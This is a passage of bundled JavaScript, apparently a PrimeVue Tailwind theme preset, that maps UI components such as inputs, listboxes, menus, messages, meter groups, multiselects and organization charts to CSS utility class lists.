          "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-secondary-500 dark:focus:ring-secondary-400 focus:z-10",
          {
            "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": t.disabled
          },
          // Filled State *for FloatLabel
          {
            filled: ((s = (o = e.instance) == null ? void 0 : o.$parentInstance) == null ? void 0 : s.$name) === "FloatLabel" && e.state.d_modelValue !== null
          },
          //Position
          {
            "order-2": e.props.buttonLayout == "horizontal" || e.props.buttonLayout === "vertical"
          }
        ]
      };
    }
  },
  buttonGroup: ({ props: e }) => ({
    class: [
      "absolute",
      "z-20",
      // Flex
      "flex",
      "flex-col",
      "top-px right-px",
      {
        "h-[calc(100%-2px)]": e.showButtons && e.buttonLayout === "stacked"
      }
    ]
  }),
  incrementButton: ({ props: e }) => ({
    class: [
      // Display
      {
        "flex flex-initial shrink-0": e.showButtons && e.buttonLayout === "horizontal"
      },
      {
        "flex flex-auto": e.showButtons && e.buttonLayout === "stacked"
      },
      // Alignment
      "items-center",
      "justify-center",
      "text-center align-bottom",
      //Position
      "relative",
      { "order-3": e.showButtons && e.buttonLayout === "horizontal" },
      { "order-1": e.showButtons && e.buttonLayout === "vertical" },
      //Color
      "text-surface-800 dark:text-surface-0",
      "bg-transparent",
      {
        "dark:bg-surface-900": e.showButtons && e.buttonLayout !== "stacked"
      },
      "border border-surface-300 dark:border-surface-700",
      { "border-0": e.showButtons && e.buttonLayout === "stacked" },
      {
        "border-l-0": e.showButtons && e.buttonLayout !== "stacked" && e.buttonLayout === "horizontal"
      },
      {
        "border-b-0": e.showButtons && e.buttonLayout !== "stacked" && e.buttonLayout === "vertical"
      },
      // Sizing
      "w-[3rem]",
      { "px-3 py-2": e.showButtons && e.buttonLayout !== "stacked" },
      { "p-0": e.showButtons && e.buttonLayout === "stacked" },
      { "w-full": e.showButtons && e.buttonLayout === "vertical" },
      // Shape
      "rounded-md",
      { "rounded-md": e.showButtons && e.buttonLayout == "stacked" },
      {
        "rounded-bl-none rounded-tl-none": e.showButtons && e.buttonLayout === "horizontal"
      },
      {
        "rounded-bl-none rounded-br-none": e.showButtons && e.buttonLayout === "vertical"
      },
      //States
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]",
      //Misc
      "cursor-pointer overflow-hidden select-none"
    ]
  }),
  incrementIcon: "inline-block w-4 h-4",
  decrementButton: ({ props: e }) => ({
    class: [
      // Display
      {
        "flex flex-initial shrink-0": e.showButtons && e.buttonLayout === "horizontal"
      },
      {
        "flex flex-auto": e.showButtons && e.buttonLayout === "stacked"
      },
      // Alignment
      "items-center",
      "justify-center",
      "text-center align-bottom",
      //Position
      "relative",
      { "order-1": e.showButtons && e.buttonLayout === "horizontal" },
      { "order-3": e.showButtons && e.buttonLayout === "vertical" },
      //Color
      "text-surface-800 dark:text-surface-0",
      "bg-transparent",
      {
        "dark:bg-surface-900": e.showButtons && e.buttonLayout !== "stacked"
      },
      "border border-surface-300 dark:border-surface-700",
      { "border-0": e.showButtons && e.buttonLayout === "stacked" },
      {
        "border-r-0": e.showButtons && e.buttonLayout !== "stacked" && e.buttonLayout === "horizontal"
      },
      {
        "border-t-0": e.showButtons && e.buttonLayout !== "stacked" && e.buttonLayout === "vertical"
      },
      // Sizing
      "w-[3rem]",
      { "px-3 py-2": e.showButtons && e.buttonLayout !== "stacked" },
      { "p-0": e.showButtons && e.buttonLayout === "stacked" },
      { "w-full": e.showButtons && e.buttonLayout === "vertical" },
      // Shape
      "rounded-md",
      {
        "rounded-tr-none rounded-tl-none rounded-bl-none": e.showButtons && e.buttonLayout === "stacked"
      },
      {
        "rounded-tr-none rounded-br-none ": e.showButtons && e.buttonLayout === "horizontal"
      },
      {
        "rounded-tr-none rounded-tl-none ": e.showButtons && e.buttonLayout === "vertical"
      },
      //States
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]",
      //Misc
      "cursor-pointer overflow-hidden select-none"
    ]
  }),
  decrementIcon: "inline-block w-4 h-4"
}, Nu = {
  root: {
    class: [
      // Alignment
      "flex items-center",
      "gap-2",
      "[&_[data-pc-name^=pcinput]]:w-10"
    ]
  }
}, Mu = {
  root: ({ props: e, context: t, parent: r }) => {
    var o, s, n, i;
    return {
      class: [
        // Font
        "leading-none",
        // Flex
        { "flex-1 w-[1%]": r.instance.$name == "InputGroup" },
        // Spacing
        "m-0",
        { "w-full": e.fluid },
        // Size
        {
          "py-3 px-3.5": e.size == "large",
          "py-1.5 px-2": e.size == "small",
          "py-2 px-3": e.size == null
        },
        // Shape
        { "rounded-md": r.instance.$name !== "InputGroup" },
        {
          "first:rounded-l-md rounded-none last:rounded-r-md": r.instance.$name == "InputGroup"
        },
        {
          "border-0 border-y border-l last:border-r": r.instance.$name == "InputGroup"
        },
        {
          "first:ml-0 -ml-px": r.instance.$name == "InputGroup" && !e.showButtons
        },
        // Colors
        "text-surface-800 dark:text-white/80",
        "placeholder:text-surface-400 dark:placeholder:text-surface-500",
        { "bg-surface-0 dark:bg-surface-950": !t.disabled },
        "border",
        { "border-surface-300 dark:border-surface-700": !e.invalid },
        // Invalid State
        "invalid:focus:ring-danger-400",
        "invalid:hover:border-danger-400",
        { "border-danger-400 dark:border-danger-400": e.invalid },
        // States
        {
          "hover:border-surface-400 dark:hover:border-surface-600": !t.disabled && !e.invalid,
          "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-secondary-500 dark:focus:ring-secondary-400 focus:z-10": !t.disabled,
          "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": t.disabled
        },
        // Filled State *for FloatLabel
        {
          filled: ((o = r.instance) == null ? void 0 : o.$name) == "FloatLabel" && t.filled || ((n = (s = r.instance) == null ? void 0 : s.$parentInstance) == null ? void 0 : n.$name) == "FloatLabel" && r.props.modelValue !== null && ((i = r.props.modelValue) == null ? void 0 : i.length) !== 0
        },
        // Misc
        "appearance-none",
        "transition-colors duration-200"
      ]
    };
  }
}, Fu = {
  root: ({ props: e }) => ({
    class: [
      // Misc
      {
        "opacity-60 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  range: {
    class: [
      // Stroke
      "stroke-current",
      // Color
      "stroke-surface-200 dark:stroke-surface-700",
      // Fill
      "fill-none",
      // Transition
      "transition duration-100 ease-in"
    ]
  },
  value: {
    class: [
      // Animation
      "animate-dash-frame",
      // Color
      "stroke-primary",
      // Fill
      "fill-none"
    ]
  },
  text: {
    class: [
      // Text Style
      "text-center text-xl",
      // Color
      "fill-surface-600 dark:fill-surface-200"
    ]
  }
}, Du = {
  root: ({ props: e }) => ({
    class: [
      "rounded-md",
      // Colors
      { "bg-surface-0 dark:bg-surface-900": !e.disabled },
      "text-surface-700 dark:text-white/80",
      "border",
      { "border-surface-300 dark:border-surface-700": !e.invalid },
      // Disabled State
      {
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      },
      // Invalid State
      { "border-red-500 dark:border-red-400": e.invalid }
    ]
  }),
  listContainer: "overflow-auto",
  list: {
    class: "p-1 list-none m-0 outline-none"
  },
  option: ({ context: e, props: t }) => ({
    class: [
      "relative",
      // Flex
      "flex items-center",
      // Font
      "leading-none",
      // Spacing
      "m-0 px-3 py-2",
      "first:mt-0 mt-[2px]",
      // Shape
      "border-0 rounded",
      // Colors
      {
        "bg-surface-200 dark:bg-surface-600/60": e.focused && !e.selected,
        "text-surface-700 dark:text-white/80": e.focused && !e.selected,
        "bg-highlight": e.selected && !t.checkmark,
        "bg-surface-0 dark:bg-surface-900": t.checkmark && e.selected
      },
      //States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.focused && !e.selected || t.checkmark && e.selected
      },
      { "hover:bg-highlight-emphasis": e.selected && !t.checkmark },
      {
        "hover:text-surface-700 hover:bg-surface-100 dark:hover:text-white dark:hover:bg-[rgba(255,255,255,0.03)]": e.focused && !e.selected
      },
      // Transition
      "transition-shadow duration-200",
      // Misc
      "cursor-pointer overflow-hidden whitespace-nowrap"
    ]
  }),
  optionGroup: {
    class: [
      "font-semibold",
      // Spacing
      "m-0 py-2 px-3",
      // Colors
      "text-surface-400 dark:text-surface-500",
      // Misc
      "cursor-auto"
    ]
  },
  optionCheckIcon: "relative -ms-1.5 me-1.5 text-surface-700 dark:text-white/80 w-4 h-4",
  emptyMessage: {
    class: [
      // Font
      "leading-none",
      // Spacing
      "py-2 px-3",
      // Color
      "text-surface-800 dark:text-white/80",
      "bg-transparent"
    ]
  },
  header: {
    class: [
      // Spacing
      "pt-2 px-2 pb-0",
      "m-0",
      //Shape
      "border-b-0",
      "rounded-tl-md",
      "rounded-tr-md",
      // Color
      "text-surface-700 dark:text-white/80",
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-300 dark:border-surface-700",
      "[&_[data-pc-name=pcfilter]]:w-full"
    ]
  }
}, Vu = {
  root: ({ props: e }) => ({
    class: [
      "relative",
      // Flexbox
      "flex",
      // Shape & Size
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-200 dark:border-surface-700",
      {
        "p-2 items-center": e.orientation == "horizontal",
        "flex-col sm:w-48 p-1": e.orientation !== "horizontal"
      }
    ]
  }),
  rootList: ({ props: e }) => ({
    class: [
      // Flexbox
      "sm:flex",
      "items-center",
      "flex-wrap",
      "flex-col sm:flex-row",
      { hidden: !(e != null && e.mobileActive), flex: e == null ? void 0 : e.mobileActive },
      // Position
      "absolute sm:relative",
      "top-full left-0",
      "sm:top-auto sm:left-auto",
      // Size
      "w-full sm:w-auto",
      // Spacing
      "m-0",
      "p-1 sm:py-0 sm:p-0",
      "list-none",
      // Shape
      "shadow-md sm:shadow-none",
      "border-0",
      // Color
      "bg-surface-0 dark:bg-surface-900 sm:bg-transparent dark:sm:bg-transparent",
      // Misc
      "outline-none"
    ]
  }),
  item: ({ props: e }) => ({
    class: [
      "sm:relative static my-[2px] [&:first-child]:mt-0",
      {
        "sm:w-auto w-full": e.horizontal,
        "w-full": !e.horizontal
      }
    ]
  }),
  itemContent: ({ context: e }) => ({
    class: [
      "rounded-[4px]",
      //  Colors
      {
        "text-surface-500 dark:text-white/70": !e.focused && !e.active,
        "text-surface-500 dark:text-white/70 bg-surface-200 dark:bg-surface-600/90": e.focused && !e.active,
        "bg-highlight text-highlight-contrast": e.focused && e.active || e.active || !e.focused && e.active
      },
      // Hover States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.active,
        "hover:bg-highlight-emphasis": e.active
      },
      // Transitions
      "transition-all",
      "duration-200"
    ]
  }),
  itemLink: {
    class: [
      "relative",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "py-2",
      "px-3",
      // Size
      "leading-none",
      // Misc
      "select-none",
      "cursor-pointer",
      "no-underline ",
      "overflow-hidden"
    ]
  },
  itemIcon: {
    class: "mr-2"
  },
  submenuIcon: ({ props: e }) => ({
    class: [
      {
        "ml-auto sm:ml-2": e.horizontal,
        "ml-auto": !e.horizontal
      }
    ]
  }),
  overlay: ({ props: e }) => ({
    class: [
      // Size
      "w-auto",
      // Spacing
      "m-0",
      // Shape
      "shadow-none sm:shadow-md",
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      // Position
      "static sm:absolute",
      "z-10",
      {
        "sm:left-full top-0": !e.horizontal
      }
    ]
  }),
  grid: {
    class: "flex flex-wrap sm:flex-nowrap"
  },
  column: {
    class: "w-full sm:w-1/2"
  },
  submenu: {
    class: ["m-0 list-none", "p-1 px-2 w-full sm:min-w-[14rem]"]
  },
  submenuLabel: {
    class: [
      "font-semibold",
      // Spacing
      "py-2 px-3",
      "m-0",
      // Color
      "text-surface-400 dark:text-surface-500",
      "bg-surface-0 dark:bg-surface-900"
    ]
  },
  separator: {
    class: "border-t border-surface-200 dark:border-surface-600"
  },
  button: {
    class: [
      // Flexbox
      "flex sm:hidden",
      "items-center justify-center",
      // Size
      "w-7",
      "h-7",
      // Shape
      "rounded-full",
      // Color
      "text-surface-500 dark:text-white/80",
      // States
      "hover:text-surface-600 dark:hover:text-white/60",
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]",
      "focus:outline-none focus:outline-offset-0",
      "focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transitions
      "transition duration-200 ease-in-out",
      // Misc
      "cursor-pointer",
      "no-underline"
    ]
  },
  end: {
    class: "ml-auto self-center"
  }
}, Bu = {
  root: {
    class: [
      // Sizing and Shape
      "min-w-[12.5rem]",
      "rounded-md",
      // Spacing
      "p-1",
      // Colors
      "bg-surface-0 dark:bg-surface-800",
      "text-surface-700 dark:text-white/80"
    ]
  },
  list: {
    class: [
      // Spacings and Shape
      "list-none",
      "m-0",
      "p-0",
      "outline-none"
    ]
  },
  item: {
    class: "relative my-[2px] [&:first-child]:mt-0"
  },
  separator: {
    class: "border-t border-surface-200 dark:border-surface-700"
  },
  itemContent: ({ context: e }) => ({
    class: [
      //Shape
      "rounded-[4px]",
      // Colors
      {
        "text-surface-500 dark:text-white/70": !e.focused && !e.active,
        "text-surface-500 dark:text-white/70 bg-surface-200 dark:bg-[rgba(255,255,255,0.03)]": e.focused && !e.active,
        "bg-highlight text-highlight-contrast": e.focused && e.active || e.active || !e.focused && e.active
      },
      // Transitions
      "transition-shadow",
      "duration-200",
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.active,
        "hover:bg-highlight-emphasis": e.active
      },
      // Disabled
      {
        "text-surface-500 pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  itemLink: {
    class: [
      "relative",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "py-2",
      "px-3",
      // Misc
      "no-underline",
      "overflow-hidden",
      "cursor-pointer",
      "select-none"
    ]
  },
  itemIcon: {
    class: [
      // Spacing
      "mr-2"
    ]
  },
  itemLabel: {
    class: ["leading-[normal]"]
  },
  submenuLabel: ({ context: e }) => ({
    class: [
      // Font
      "font-bold",
      // Spacing
      "m-0",
      "py-2 px-3",
      // Shape
      "rounded-tl-none",
      "rounded-tr-none",
      // Colors
      "bg-surface-0 dark:bg-surface-800",
      "text-surface-400 dark:text-surface-300"
    ]
  }),
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, Ku = {
  root: {
    class: [
      "relative",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "p-2",
      // Shape
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-800",
      "border border-surface-200 dark:border-none"
    ]
  },
  rootList: ({ props: e }) => ({
    class: [
      // Flexbox
      "sm:flex",
      "items-center",
      "flex-wrap",
      "flex-col sm:flex-row",
      { hidden: !(e != null && e.mobileActive), flex: e == null ? void 0 : e.mobileActive },
      // Position
      "absolute sm:relative",
      "top-full left-0",
      "sm:top-auto sm:left-auto",
      // Size
      "w-full sm:w-auto",
      // Spacing
      "m-0",
      "p-1 sm:py-0 sm:p-0",
      "list-none",
      // Shape
      "shadow-md sm:shadow-none",
      "border-0",
      // Color
      "bg-surface-0 dark:bg-surface-800 sm:bg-transparent",
      // Misc
      "outline-none"
    ]
  }),
  item: {
    class: "sm:relative sm:w-auto w-full static my-[2px] [&:first-child]:mt-0"
  },
  itemContent: ({ context: e }) => ({
    class: [
      // Shape
      "rounded-[4px]",
      // Colors
      {
        "text-surface-500 dark:text-white/70": !e.focused && !e.active,
        "text-surface-500 dark:text-white/70 bg-surface-200 dark:bg-surface-600/90": e.focused && !e.active,
        "bg-highlight text-highlight-contrast": e.focused && e.active || e.active || !e.focused && e.active
      },
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.active,
        "hover:bg-highlight-emphasis": e.active
      },
      // Disabled State
      { "opacity-60 pointer-events-none cursor-default": e.disabled },
      // Transitions
      "transition-all",
      "duration-200"
    ]
  }),
  itemLink: ({ context: e }) => ({
    class: [
      "relative",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "py-2",
      "px-3",
      // Size
      {
        "pl-9 sm:pl-5": e.level === 1,
        "pl-14 sm:pl-5": e.level === 2
      },
      "leading-none",
      // Misc
      "select-none",
      "cursor-pointer",
      "no-underline ",
      "overflow-hidden"
    ]
  }),
  itemIcon: {
    class: "mr-2"
  },
  submenuIcon: ({ props: e }) => ({
    class: [
      {
        "ml-auto sm:ml-2": e.root,
        "ml-auto": !e.root
      }
    ]
  }),
  submenu: ({ props: e }) => ({
    class: [
      "flex flex-col",
      // Size
      "rounded-md",
      "min-w-[12.5rem]",
      // Spacing
      "p-1",
      "m-0",
      "list-none",
      // Shape
      "shadow-none sm:shadow-md",
      "border border-surface-200 dark:border-surface-700",
      // Position
      "static sm:absolute",
      "z-10",
      { "sm:absolute sm:left-full sm:top-0": e.level > 1 },
      // Color
      "bg-surface-0 dark:bg-surface-900"
    ]
  }),
  separator: {
    class: "border-t border-surface-200 dark:border-surface-600"
  },
  button: {
    class: [
      // Flexbox
      "flex sm:hidden",
      "items-center justify-center",
      // Size
      "w-7",
      "h-7",
      // Shape
      "rounded-full",
      // Color
      "text-surface-500 dark:text-white/80",
      // States
      "hover:text-surface-600 dark:hover:text-white/60",
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]",
      "focus:outline-none focus:outline-offset-0",
      "focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transitions
      "transition duration-200 ease-in-out",
      // Misc
      "cursor-pointer",
      "no-underline"
    ]
  },
  end: {
    class: "ml-auto self-center"
  }
}, Hu = {
  root: ({ props: e }) => ({
    class: [
      // Spacing and Shape
      "rounded-md",
      "outline",
      // Colors
      {
        "bg-blue-100/70 dark:bg-blue-500/20": e.severity == "info",
        "bg-green-100/70 dark:bg-green-500/20": e.severity == "success",
        "bg-surface-100/70 dark:bg-surface-500/20": e.severity == "secondary",
        "bg-orange-100/70 dark:bg-orange-500/20": e.severity == "warn",
        "bg-red-100/70 dark:bg-red-500/20": e.severity == "error",
        "bg-surface-950 dark:bg-surface-0": e.severity == "contrast"
      },
      {
        "outline-blue-200 dark:outline-blue-500/20": e.severity == "info",
        "outline-green-200 dark:outline-green-500/20": e.severity == "success",
        "outline-surface-200 dark:outline-surface-500/20": e.severity == "secondary",
        "outline-orange-200 dark:outline-orange-500/20": e.severity == "warn",
        "outline-red-200 dark:outline-red-500/20": e.severity == "error",
        "outline-surface-950 dark:outline-surface-0": e.severity == "contrast"
      },
      {
        "text-blue-700 dark:text-blue-300": e.severity == "info",
        "text-green-700 dark:text-green-300": e.severity == "success",
        "text-surface-700 dark:text-surface-300": e.severity == "secondary",
        "text-orange-700 dark:text-orange-300": e.severity == "warn",
        "text-red-700 dark:text-red-300": e.severity == "error",
        "text-surface-0 dark:text-surface-950": e.severity == "contrast"
      }
    ]
  }),
  content: {
    class: [
      // Flexbox
      "flex items-center h-full",
      // Spacing
      "py-2 px-3 gap-2"
    ]
  },
  icon: {
    class: [
      // Sizing and Spacing
      "shrink-0 w-[1.125rem] h-[1.125rem]"
    ]
  },
  text: {
    class: [
      // Font and Text
      "text-base leading-[normal]",
      "font-medium"
    ]
  },
  closeButton: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex items-center justify-center",
      // Size
      "w-7 h-7",
      // Spacing and Misc
      "ml-auto relative",
      // Shape
      "rounded-full",
      // Colors
      "bg-transparent",
      // Transitions
      "transition duration-200 ease-in-out",
      // States
      "hover:bg-surface-0/30 dark:hover:bg-[rgba(255,255,255,0.03)]",
      "focus:outline-none focus:outline-offset-0 focus:ring-1",
      {
        "focus:ring-blue-500 dark:focus:ring-blue-400": e.severity == "info",
        "focus:ring-green-500 dark:focus:ring-green-400": e.severity == "success",
        "focus:ring-surface-500 dark:focus:ring-surface-400": e.severity == "secondary",
        "focus:ring-orange-500 dark:focus:ring-orange-400": e.severity == "warn",
        "focus:ring-red-500 dark:focus:ring-red-4000": e.severity == "error",
        "focus:ring-surface-0 dark:focus:ring-surface-950": e.severity == "contrast"
      },
      // Misc
      "overflow-hidden"
    ]
  }),
  transition: {
    enterFromClass: "opacity-0",
    enterActiveClass: "transition-opacity duration-300",
    leaveFromClass: "max-h-40",
    leaveActiveClass: "overflow-hidden transition-all duration-300 ease-in",
    leaveToClass: "max-h-0 opacity-0 !m-0"
  }
}, Wu = {
  root: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex gap-4",
      {
        "flex-col": e.orientation == "horizontal",
        "flex-row": e.orientation == "vertical"
      }
    ]
  }),
  meters: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex",
      { "flex-col": e.orientation === "vertical" },
      // Sizing
      { "w-2 h-full": e.orientation === "vertical" },
      { "h-2": e.orientation === "horizontal" },
      // Colors
      "bg-gray-200 dark:bg-gray-700",
      // Border Radius
      "rounded-lg"
    ]
  }),
  meter: ({ props: e }) => ({
    class: [
      // Shape
      "border-0",
      // Rounded Corners - Horizontal
      {
        "first:rounded-l-lg last:rounded-r-lg": e.orientation === "horizontal"
      },
      // Rounded Corners - Vertical
      {
        "first:rounded-t-lg last:rounded-b-lg": e.orientation === "vertical"
      },
      // Colors
      "bg-primary"
    ]
  }),
  labelList: ({ props: e }) => ({
    class: [
      // Display & Flexbox
      "flex flex-wrap",
      { "gap-4": e.labelOrientation === "horizontal" },
      { "gap-2": e.labelOrientation === "vertical" },
      { "flex-col": e.labelOrientation === "vertical" },
      // Conditional Alignment - Horizontal
      {
        "align-end": e.labelOrientation === "horizontal" && e.labelPosition === "end",
        "align-start": e.labelOrientation === "horizontal" && e.labelPosition === "start"
      },
      // Conditional Alignment - Vertical
      {
        "justify-start": e.labelOrientation === "vertical" && e.labelPosition === "start"
      },
      // List Styling
      "m-0 p-0 list-none"
    ]
  }),
  label: {
    class: [
      // Flexbox
      "inline-flex",
      "items-center",
      "gap-2"
    ]
  },
  labelMarker: {
    class: [
      // Display
      "inline-flex",
      // Background Color
      "bg-primary",
      // Size
      "w-2 h-2",
      // Rounded Shape
      "rounded-full"
    ]
  }
}, Ju = {
  root: ({ props: e, state: t }) => ({
    class: [
      // Font
      "leading-none",
      // Display and Position
      "inline-flex",
      "relative",
      // Shape
      "rounded-md",
      // Color and Background
      { "bg-surface-0 dark:bg-surface-950": !e.disabled },
      "border",
      { "border-surface-300 dark:border-surface-600": !e.invalid },
      // Invalid State
      "invalid:focus:ring-red-200",
      "invalid:hover:border-red-500",
      { "border-red-500 dark:border-red-400": e.invalid },
      // Transitions
      "transition-all",
      "duration-200",
      // States
      {
        "hover:border-surface-400 dark:hover:border-surface-700": !e.invalid
      },
      {
        "outline-none outline-offset-0 z-10 ring-1 ring-primary-500 dark:ring-primary-400": t.focused
      },
      // Misc
      "cursor-pointer",
      "select-none",
      {
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  labelContainer: "overflow-hidden flex flex-auto cursor-pointer",
  label: ({ props: e, parent: t }) => {
    var r, o, s, n, i, a, l, u;
    return {
      class: [
        "text-base leading-2",
        // Spacing
        {
          "py-2 px-3": e.display === "comma" || e.display === "chip" && !((r = e == null ? void 0 : e.modelValue) != null && r.length),
          "py-1 px-1": e.display === "chip" && ((o = e == null ? void 0 : e.modelValue) == null ? void 0 : o.length) > 0
        },
        // Color
        {
          "text-surface-800 dark:text-white/80": (s = e.modelValue) == null ? void 0 : s.length,
          "text-surface-400 dark:text-surface-500": !((n = e.modelValue) != null && n.length)
        },
        {
          "placeholder:text-transparent dark:placeholder:text-transparent": ((i = t.instance) == null ? void 0 : i.$name) == "FloatLabel",
          "!text-transparent dark:!text-transparent": ((a = t.instance) == null ? void 0 : a.$name) == "FloatLabel" && e.modelValue == null || ((l = e.modelValue) == null ? void 0 : l.length) == 0
        },
        // Filled State *for FloatLabel
        {
          filled: ((u = t.instance) == null ? void 0 : u.$name) == "FloatLabel" && e.modelValue !== null
        },
        // Transitions
        "transition duration-200",
        // Misc
        "overflow-hidden whitespace-nowrap cursor-pointer overflow-ellipsis"
      ]
    };
  },
  dropdown: {
    class: [
      // Flexbox
      "flex items-center justify-center",
      "shrink-0",
      // Color and Background
      "bg-transparent",
      "text-surface-500",
      // Size
      "w-12",
      // Shape
      "rounded-r-md"
    ]
  },
  overlay: {
    class: [
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      // Shape
      "border border-surface-300 dark:border-surface-700",
      "rounded-md",
      "shadow-md",
      "mt-[2px]"
    ]
  },
  header: {
    class: [
      //Flex
      "flex items-center justify-between",
      // Spacing
      "pt-2 px-4 pb-0 gap-2",
      "m-0",
      //Shape
      "border-b-0",
      "rounded-tl-md",
      "rounded-tr-md",
      // Color
      "text-surface-700 dark:text-white/80",
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-300 dark:border-surface-700",
      "[&_[data-pc-name=pcfiltercontainer]]:!flex-auto",
      "[&_[data-pc-name=pcfilter]]:w-full"
    ]
  },
  listContainer: {
    class: [
      // Sizing
      "max-h-[200px]",
      // Misc
      "overflow-auto"
    ]
  },
  list: {
    class: "p-1 list-none m-0"
  },
  option: ({ context: e }) => ({
    class: [
      "relative",
      "flex items-center",
      // Font
      "leading-none",
      // Spacing
      "m-0 px-3 py-2 gap-2",
      "first:mt-0 mt-[2px]",
      // Shape
      "border-0 rounded",
      // Colors
      {
        "bg-surface-200 dark:bg-surface-600/60": e.focused && !e.selected,
        "text-surface-700 dark:text-white/80": e.focused && !e.selected,
        "bg-highlight": e.selected
      },
      //States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.focused && !e.selected
      },
      { "hover:bg-highlight-emphasis": e.selected },
      {
        "hover:text-surface-700 hover:bg-surface-100 dark:hover:text-white dark:hover:bg-[rgba(255,255,255,0.03)]": e.focused && !e.selected
      },
      // Transition
      "transition-shadow duration-200",
      // Misc
      "cursor-pointer overflow-hidden whitespace-nowrap"
    ]
  }),
  optionGroup: {
    class: [
      "font-semibold",
      // Spacing
      "m-0 py-2 px-3",
      // Colors
      "text-surface-400 dark:text-surface-500",
      // Misc
      "cursor-auto"
    ]
  },
  emptyMessage: {
    class: [
      // Font
      "leading-none",
      // Spacing
      "py-2 px-3",
      // Color
      "text-surface-800 dark:text-white/80",
      "bg-transparent"
    ]
  },
  loadingIcon: {
    class: "text-surface-400 dark:text-surface-500 animate-spin"
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, Uu = {
  root: "flex",
  controls: {
    class: [
      // Flexbox & Alignment
      "flex xl:flex-col justify-center gap-2",
      // Spacing
      "p-[1.125rem]"
    ]
  },
  container: {
    class: [
      "flex-auto",
      // Shape
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-200 dark:border-surface-700",
      "outline-none"
    ]
  }
}, Gu = {
  table: {
    class: [
      // Spacing & Position
      "mx-auto my-0",
      // Table Style
      "border-spacing-0 border-separate"
    ]
  },
  cell: {
    class: [
      // Alignment
      "text-center align-top",
      // Spacing
      "py-0 px-3"
    ]
  },
  node: ({ context: e }) => ({
    class: [
      "relative inline-block",
      // Spacing
      "py-3 px-4",
      // Shape
      "border",
      "rounded-md",
      "border-surface-200 dark:border-surface-700",
      // Color
      {
        "text-surface-600 dark:text-white/80": !(e != null && e.selected),
        "bg-surface-0 dark:bg-surface-900": !(e != null && e.selected),
        "bg-highlight": e == null ? void 0 : e.selected
      },
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-surface-800": (e == null ? void 0 : e.selectable) && !(e != null && e.selected),
        "hover:bg-highlight-emphasis": (e == null ? void 0 : e.selectable) && (e == null ? void 0 : e.selected)
      },
      { "cursor-pointer": e == null ? void 0 : e.selectable }
    ]
  }),
  lineCell: {
    class: [
      // Alignment
      "text-center align-top",
      // Spacing
      "py-0 px-3"
    ]
  },
  connectorDown: {
    class: [
      // Spacing
      "mx-auto my-0",
      // Size
      "w-px h-[20px]",
      // Color
      "bg-surface-200 dark:bg-surface-700"
    ]
  },
  connectorLeft: ({ context: e }) => ({
    class: [
      // Alignment
      "text-center align-top",
      // Spacing
      "py-0 px-3",
      // Shape
      "rounded-none border-r",
      { "border-t": e.lineTop },
      // Color
      "border-surface-200 dark:border-surface-700"
    ]
  }),
  connectorRight: ({ context: e }) => ({
    class: [
      // Alignment
      "text-center align-top",
      // Spacing
      "py-0 px-3",
      // Shape
      "rounded-none",
      // Color
      {
        "border-t border-surface-200 dark:border-surface-700": e.lineTop
      }
    ]
  }),
  nodeCell: {
    class: "text-center align-top py-0 px-3"
  },
  nodeToggleButton: {
    class: [
      // Position
      "absolute bottom-[-0.75rem] left-2/4 -ml-3",
      "z-20",
      // Flexbox
      "flex items-center justify-center",
      // Size
      "w-6 h-6",
      // Shape
      "rounded-full",
      "border border-surface-200 dark:border-surface-700",
      // Color
      "bg-inherit text-inherit",
      // Focus
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Misc
      "cursor-pointer no-underline select-none"
    ]
  },
  nodeToggleButtonIcon: {
    class: [
      // Position
      "static inline-block",
      // Size
      "w-4 h-4"
    ]
  }
}, qu = {
  root: {
    class: [
      "relative",
      "[&>[data-pc-name=pcbadge]]:absolute",
